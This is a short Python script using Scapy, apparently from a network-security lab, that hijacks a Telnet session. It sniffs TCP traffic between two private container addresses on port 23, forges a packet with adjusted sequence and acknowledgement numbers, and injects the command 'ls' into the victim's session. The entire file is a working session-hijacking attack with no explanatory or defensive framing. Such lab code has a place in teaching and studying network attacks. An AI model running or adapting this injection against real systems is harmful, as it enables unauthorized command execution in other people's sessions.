#!/usr/bin/python3
from scapy.all import *

SRC  = "172.17.0.4"
DST  = "172.17.0.3"
PORT = 23

def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]

    #############################################
    ip  =  IP( src   = old_ip.src,
               dst   = old_ip.dst
             )
    tcp = TCP( sport = old_tcp.sport,
               dport = old_tcp.dport,
               seq   = old_tcp.seq+1,
               ack   = old_tcp.ack+1,
               flags = "A"
             )
    data = "\n ls \n"
    #############################################

    pkt = ip/tcp/data
    send(pkt,verbose=0)
    ls(pkt)
    quit()

f = 'tcp and src host {} and dst host {} and dst port {}'.format(SRC, DST, PORT)
sniff(filter=f, prn=spoof)

